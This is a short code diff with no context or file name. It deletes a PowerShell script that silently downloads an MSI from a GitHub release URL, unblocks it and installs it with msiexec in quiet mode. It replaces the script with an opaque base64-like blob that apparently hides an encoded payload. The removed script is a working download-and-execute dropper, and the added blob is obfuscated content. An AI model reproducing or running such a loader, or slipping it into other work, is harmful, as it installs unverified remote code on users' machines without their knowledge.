@@ -1,9 +1,1 @@
-$ErrorActionPreference = 'Stop'
-try {
-    $msi = "$env:TEMP\doc.msi"
-    curl.exe -s -L -o $msi "https://github.com/okursammyok-ship-it/t/releases/download/new/doc.msi"
-    Unblock-File $msi
-    Start-Process msiexec.exe -ArgumentList '/i', $msi, '/qn', '/norestart' -Wait
-} catch {
-    $_ | Out-File "$env:USERPROFILE\Desktop\ps_err.txt"
-}
+92BKSS/ID3nLSraX1NkK2cyEYXV6Pi33y0iSMfb5U3ypFBbDIt2c9GM7ZzdfFs/KmV2q66mtshyeGp+9Y4psV8Uq3w+yIsEIYiCD0XS0aWtdhl835Q5WPBiyZDwm7Wtny0pPDtlr0JXiQcFjMniS+ikq5z+lDmKGEohkWIfgacAhtVpNjwzn+4FXxzwDrWSthKpMQwts5+IbsL90A130/oKk4niAcBJwaBcdQ4xxJOZVa1zm3grWcJ1pjeszObfJ4UR+cLmeVk5rrzWLT51tMq+eKKcvA6uIwSVVhqSPssC0309PDyC70JHLYr2UMEBKzLgb5K4AKuMqP1OZbk/jaAiBtRnjwUdGchpXUELiDtPyC5K7BiE/COJcyFeJr1+UX97oKYMy9hUoS2b8QSHgrVPH16RQD4l0UfFOqsBavSmf5g3+wnZCrz/ACT4hVto+AG2BmshqqlrJlwGoCcQwGu6hXak6et8Yq98sSm+UXOQ=
